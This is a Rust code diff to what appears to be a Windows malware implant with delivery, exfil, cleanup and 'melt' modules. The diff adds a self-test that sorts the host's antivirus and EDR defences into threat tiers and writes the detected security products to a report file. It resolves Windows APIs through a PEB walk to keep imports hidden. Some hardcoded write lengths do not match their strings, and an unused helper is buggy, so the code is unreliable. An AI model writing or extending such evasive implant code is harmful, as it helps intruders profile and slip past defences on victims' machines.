@@ -25,6 +25,7 @@ pub mod melt;
 
 pub mod delivery;
 
+use core::ffi::c_void;
 use crate::heap::{String, Vec};
 pub mod exfil;
 pub mod cleanup;
@@ -874,8 +875,78 @@ impl Max for ThreatTier {
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_trex() -> ! {
     let assessment = assess_user_mode();
+
+    // Write diagnostic report to C:\nyx\trex_report.txt
+    write_report(&assessment);
+
     let code = 0xE0u32 + (assessment.tier as u32);
     exit_process(code);
+}
+
+unsafe fn write_report(a: &TargetAssessment) {
+    // Resolve CreateFileW + WriteFile + CloseHandle via PEB walk
+    let cf = crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW")
+        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"CreateFileW"));
+    let wf = crate::resolve::export_addr(b"kernel32.dll", b"WriteFile")
+        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"WriteFile"));
+    let ch = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle")
+        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"CloseHandle"));
+
+    let (Some(cf), Some(wf), Some(ch)) = (cf, wf, ch) else { return };
+
+    type FnCF = unsafe extern "system" fn(*const u16, u32, u32, *mut c_void, u32, u32, *mut c_void) -> *mut c_void;
+    type FnWF = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
+    type FnCH = unsafe extern "system" fn(*mut c_void) -> i32;
+
+    let create: FnCF = core::mem::transmute(cf);
+    let write: FnWF = core::mem::transmute(wf);
+    let close: FnCH = core::mem::transmute(ch);
+
+    let path: [u16; 48] = {
+        let s = b"C:\\nyx\\trex_report.txt";
+        let mut a = [0u16; 48];
+        for i in 0..s.len() { a[i] = s[i] as u16; }
+        a
+    };
+
+    let h = create(path.as_ptr(), 0x4000_0000, 0, core::ptr::null_mut(), 2, 0x80, core::ptr::null_mut());
+    if h as isize == -1 || h.is_null() { return; }
+
+    let mut written: u32 = 0;
+    let _ = write(h, b"=== T-REX v2 Assessment ===\r\n".as_ptr(), 28, &mut written, core::ptr::null_mut());
+    // Tier
+    let tier_str = match a.tier {
+        ThreatTier::Clean => "Tier: Clean (0) - No EDR/AV detected\r\n",
+        ThreatTier::ConsumerAV => "Tier: ConsumerAV (1) - Basic AV only\r\n",
+        ThreatTier::EnterpriseEDR => "Tier: EnterpriseEDR (2) - Enterprise EDR present\r\n",
+        ThreatTier::KernelArmed => "Tier: KernelArmed (3) - Kernel callbacks active\r\n",
+        ThreatTier::Fortress => "Tier: Fortress (4) - HVCI+CET+CFG strict\r\n",
+        _ => "Tier: Unknown\r\n",
+    };
+    let _ = write(h, tier_str.as_ptr(), tier_str.len() as u32, &mut written, core::ptr::null_mut());
+    let prod_count = a.products.len();
+    let _ = write(h, b"Products detected: ".as_ptr(), 19, &mut written, core::ptr::null_mut());
+    let count_byte = [b'0' + (prod_count as u8).min(9), b'\r', b'\n'];
+    let _ = write(h, count_byte.as_ptr(), 3, &mut written, core::ptr::null_mut());
+    for p in a.products.iter() {
+        let name = p.vendor.default_name();
+        let _ = write(h, b"  - ".as_ptr(), 4, &mut written, core::ptr::null_mut());
+        let _ = write(h, name.as_ptr(), name.len() as u32, &mut written, core::ptr::null_mut());
+        let _ = write(h, b"\r\n".as_ptr(), 2, &mut written, core::ptr::null_mut());
+    }
+    let _ = write(h, b"\r\nRecommendation: ".as_ptr(), 17, &mut written, core::ptr::null_mut());
+    let _ = write(h, a.recommendation.as_ptr(), a.recommendation.len() as u32, &mut written, core::ptr::null_mut());
+    let _ = write(h, b"\r\n".as_ptr(), 2, &mut written, core::ptr::null_mut());
+}
+
+fn format_tier_num(t: u32) -> [u8; 8] {
+    let mut buf = [b' ' as u8; 8];
+    buf[0] = b'(';
+    let mut n = t;
+    let mut i = 7usize;
+    loop { buf[i] = b'0' + (n % 10) as u8; n /= 10; if n == 0 { break; } i -= 1; }
+    buf[7] = b')';
+    buf
 }
 
 unsafe fn exit_process(code: u32) -> ! {
